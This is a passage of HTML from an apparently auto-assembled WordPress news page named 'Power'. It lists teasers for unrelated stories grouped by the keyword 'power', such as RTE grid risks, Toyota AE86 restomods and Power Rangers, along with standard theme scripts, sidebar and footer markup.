        <a class="link-div" href="post/30/index.html"></a>
    </div> 
</div>
                                            <div class="mg-sec-top-post py-3 col">
                                                    <div class="mg-blog-category"> 
                                                        <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                                    </div>

                                                    <h4 class="entry-title title"><a href="post/30/index.html">France&#8217;s RTE grid operator: most power risks behind us but some &#8230; &#8211; Reuters</a></h4>
                                                        <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/user/index.html"><i class="fas fa-user-circle"></i> 
        admin</a>
         
    </div>
    
                                                
                                                    <div class="mg-content">
                                                        <p>France's RTE power grid operator said on Wednesday that French power consumption declined by 8.5% since the start of the winter thanks to energy savings measures by households and businesses&hellip;</p>
                                                </div>
                                            </div>
                                    </article>
                                                                         <article class="d-md-flex mg-posts-sec-post align-items-center">
                                    <div class="col-12 col-md-6">
    <div class="mg-post-thumb back-img md" style="background-image: url('wp-content/uploads/NaN/NaN/thumb28.jpg');">
        <span class="post-form"><i class="fas fa-camera"></i></span>
        <a class="link-div" href="post/28/index.html"></a>
    </div> 
</div>
                                            <div class="mg-sec-top-post py-3 col">
                                                    <div class="mg-blog-category"> 
                                                        <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                                    </div>

                                                    <h4 class="entry-title title"><a href="post/28/index.html">Batteries and hydrogen power these cute Toyota AE86 factory restomods</a></h4>
                                                        <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/JonathanM.Gitlin/index.html"><i class="fas fa-user-circle"></i> 
        Jonathan M. Gitlin</a>
         
    </div>
    
                                                
                                                    <div class="mg-content">
                                                        <p>The Toyota AE86 is beloved due to its role in the anime Initial D.</p>
                                                </div>
                                            </div>
                                    </article>
                                                                         <div class="col-md-12 text-center d-md-flex justify-content-center">
                                        
	<nav class="navigation pagination" aria-label="Posts">
		<h2 class="screen-reader-text">Posts navigation</h2>
		<div class="nav-links"><span aria-current="page" class="page-numbers current">1</span>
<a class="page-numbers" href="page/2/index.html">2</a>
<a class="next page-numbers" href="page/2/index.html"><i class="fas fa-angle-right"></i></a></div>
	</nav>                                    </div>
                                </div>
                                <!-- // mg-posts-sec-inner -->
                            </div>
                            <!-- // mg-posts-sec block_6 -->

                            <!--col-md-12-->
</div>                    </div>
                                        
                    <!--/col-md-8-->
                                        <!--col-md-4-->
                    <aside class="col-md-4">
                        
<aside id="secondary" class="widget-area" role="complementary">
	<div id="sidebar-right" class="mg-sidebar">
		<div id="block-2" class="mg-widget widget_block widget_search"><form role="search" method="get" action="" class="wp-block-search__button-outside wp-block-search__text-button wp-block-search"><label for="wp-block-search__input-1" class="wp-block-search__label">Search</label><div class="wp-block-search__inside-wrapper " ><input type="search" id="wp-block-search__input-1" class="wp-block-search__input " name="s" value="" placeholder=""  required /><button type="submit" class="wp-block-search__button  "  >Search</button></div></form></div><div id="block-3" class="mg-widget widget_block"><div class="wp-container-1 wp-block-group"><div class="wp-block-group__inner-container"><h2>Recent posts</h2><ul class="wp-block-latest-posts__list wp-block-latest-posts"><li><a class="wp-block-latest-posts__post-title" href="post/46/index.html">Power Rankings &#8211; IIHF</a></li>
<li><a class="wp-block-latest-posts__post-title" href="post/44/index.html">Hotwire Your Broken Thermostat in a Weather Emergency</a></li>
<li><a class="wp-block-latest-posts__post-title" href="post/42/index.html">Amy Jo Johnson Reveals Why She Isn&#8217;t Returning for Power Rangers&#8217; 30th Anniversary</a></li>
<li><a class="wp-block-latest-posts__post-title" href="post/40/index.html">Taliban and China firm agree Afghanistan oil extraction deal</a></li>
<li><a class="wp-block-latest-posts__post-title" href="post/38/index.html">What Counts as a &#8216;Renewable&#8217; Fuel?</a></li>
</ul></div></div></div><div id="block-4" class="mg-widget widget_block"><div class="wp-container-2 wp-block-group"><div class="wp-block-group__inner-container"><h2>Recent comments</h2><div class="no-comments wp-block-latest-comments">No comments to show.</div></div></div></div>	</div>
</aside><!-- #secondary -->
                    </aside>
                    <!--/col-md-4-->
                                    </div>
                <!--/row-->
    </div>
  <div class="container-fluid mr-bot40 mg-posts-sec-inner">
        <div class="missed-inner">
        <div class="row">
                        <div class="col-md-12">
                <div class="mg-sec-title">
                    <!-- mg-sec-title -->
                    <h4>You missed</h4>
                </div>
            </div>
                            <!--col-md-3-->
                <div class="col-md-3 col-sm-6 pulse animated">
               <div class="mg-blog-post-3 minh back-img" 
                                                        style="background-image: url('wp-content/uploads/NaN/NaN/thumb46.jpg');" >
                            <a class="link-div" href="post/46/index.html"></a>
                    <div class="mg-blog-inner">
                      <div class="mg-blog-category">
                      <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                      </div>
                      <h4 class="title"> <a href="post/46/index.html" title="Permalink to: Power Rankings &#8211; IIHF"> Power Rankings &#8211; IIHF</a> </h4>
                          <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/user/index.html"><i class="fas fa-user-circle"></i> 
        admin</a>
         
    </div>
                        </div>
                </div>
            </div>
            <!--/col-md-3-->
                         <!--col-md-3-->
                <div class="col-md-3 col-sm-6 pulse animated">
               <div class="mg-blog-post-3 minh back-img" 
                                                        style="background-image: url('wp-content/uploads/NaN/NaN/thumb44.jpg');" >
                            <a class="link-div" href="post/44/index.html"></a>
                    <div class="mg-blog-inner">
                      <div class="mg-blog-category">
                      <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                      </div>
                      <h4 class="title"> <a href="post/44/index.html" title="Permalink to: Hotwire Your Broken Thermostat in a Weather Emergency"> Hotwire Your Broken Thermostat in a Weather Emergency</a> </h4>
                          <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/JeffSomers/index.html"><i class="fas fa-user-circle"></i> 
        Jeff Somers</a>
         
    </div>
                        </div>
                </div>
            </div>
            <!--/col-md-3-->
                         <!--col-md-3-->
                <div class="col-md-3 col-sm-6 pulse animated">
               <div class="mg-blog-post-3 minh back-img" 
                                                        style="background-image: url('wp-content/uploads/NaN/NaN/thumb42.png');" >
                            <a class="link-div" href="post/42/index.html"></a>
                    <div class="mg-blog-inner">
                      <div class="mg-blog-category">
                      <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                      </div>
                      <h4 class="title"> <a href="post/42/index.html" title="Permalink to: Amy Jo Johnson Reveals Why She Isn&#8217;t Returning for Power Rangers&#8217; 30th Anniversary"> Amy Jo Johnson Reveals Why She Isn&#8217;t Returning for Power Rangers&#8217; 30th Anniversary</a> </h4>
                          <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/JamesWhitbrook/index.html"><i class="fas fa-user-circle"></i> 
        James Whitbrook</a>
         
    </div>
                        </div>
                </div>
            </div>
            <!--/col-md-3-->
                         <!--col-md-3-->
                <div class="col-md-3 col-sm-6 pulse animated">
               <div class="mg-blog-post-3 minh back-img" 
                                                        style="background-image: url('wp-content/uploads/NaN/NaN/thumb40.jpg');" >
                            <a class="link-div" href="post/40/index.html"></a>
                    <div class="mg-blog-inner">
                      <div class="mg-blog-category">
                      <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                      </div>
                      <h4 class="title"> <a href="post/40/index.html" title="Permalink to: Taliban and China firm agree Afghanistan oil extraction deal"> Taliban and China firm agree Afghanistan oil extraction deal</a> </h4>
                          <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/https://www.facebook.com/bbcnews/index.html"><i class="fas fa-user-circle"></i> 
        https://www.facebook.com/bbcnews</a>
         
    </div>
                        </div>
                </div>
            </div>
            <!--/col-md-3-->
                     

                </div>
            </div>
        </div>
<!--==================== FOOTER AREA ====================-->
        <footer> 
            <div class="overlay" style="background-color: ;">
                <!--Start mg-footer-widget-area-->
                                 <!--End mg-footer-widget-area-->
                <!--Start mg-footer-widget-area-->
                <div class="mg-footer-bottom-area">
                    <div class="container-fluid">
                        <div class="divide-line"></div>
                        <div class="row align-items-center">
                            <!--col-md-4-->
                            <div class="col-md-6">
                                                             <div class="site-branding-text">
                              <h1 class="site-title"> <a href="" rel="home">Power</a></h1>
                              <p class="site-description">utilize rich relationships</p>
                              </div>
                                                          </div>

                             
                            <div class="col-md-6 text-right text-xs">
                                
                            <ul class="mg-social">
                                    
                                                                         
                                                                        
                                                                 </ul>


                            </div>
                            <!--/col-md-4-->  
                             
                        </div>
                        <!--/row-->
                    </div>
                    <!--/container-->
                </div>
                <!--End mg-footer-widget-area-->

                <div class="mg-footer-copyright">
                    <div class="container-fluid">
                        <div class="row">
                                                      <div class="col-md-6 text-xs">
                                                            <p>
                                <a href="https://wordpress.org/">
								Proudly powered by WordPress								</a>
								<span class="sep"> | </span>
								Theme: Newsup by <a href="https://themeansar.com/" rel="designer">Themeansar</a>.								</p>
                            </div>


                                                        <div class="col-md-6 text-right text-xs">
                                <ul class="info-right"><li class="nav-item menu-item active"><a class="nav-link " href="" title="Home">Home</a></li><li class="nav-item menu-item page_item dropdown page-item-50"><a class="nav-link" href="cookies/index.html">Cookie policy</a></li><li class="nav-item menu-item page_item dropdown page-item-48"><a class="nav-link" href="privacy-policy/index.html">Privacy policy</a></li><li class="nav-item menu-item page_item dropdown page-item-49"><a class="nav-link" href="terms-of-use/index.html">Terms of use</a></li></ul>
                            </div>
                                                  </div>
                    </div>
                </div>
            </div>
            <!--/overlay-->
        </footer>
        <!--/footer-->
    </div>
  </div>
    <!--/wrapper-->
    <!--Scroll To Top-->
    <a href="#" class="ta_upscr bounceInup animated"><i class="fas fa-angle-up"></i></a>
    <!--/Scroll To Top-->
<!-- /Scroll To Top -->
<style>.wp-container-1 > .alignleft { float: left; margin-inline-start: 0; margin-inline-end: 2em; }.wp-container-1 > .alignright { float: right; margin-inline-start: 2em; margin-inline-end: 0; }.wp-container-1 > .aligncenter { margin-left: auto !important; margin-right: auto !important; }</style>
<style>.wp-container-2 > .alignleft { float: left; margin-inline-start: 0; margin-inline-end: 2em; }.wp-container-2 > .alignright { float: right; margin-inline-start: 2em; margin-inline-end: 0; }.wp-container-2 > .aligncenter { margin-left: auto !important; margin-right: auto !important; }</style>
<script type='text/javascript' src='wp-content/themes/newsup/js/custom.js?ver=6.0' id='newsup-custom-js'></script>
<script type='text/javascript' src='wp-content/themes/newsup/js/custom-time.js?ver=6.0' id='newsup-custom-time-js'></script>
	<script>
	/(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())},!1);
	</script>
	</body>
</html>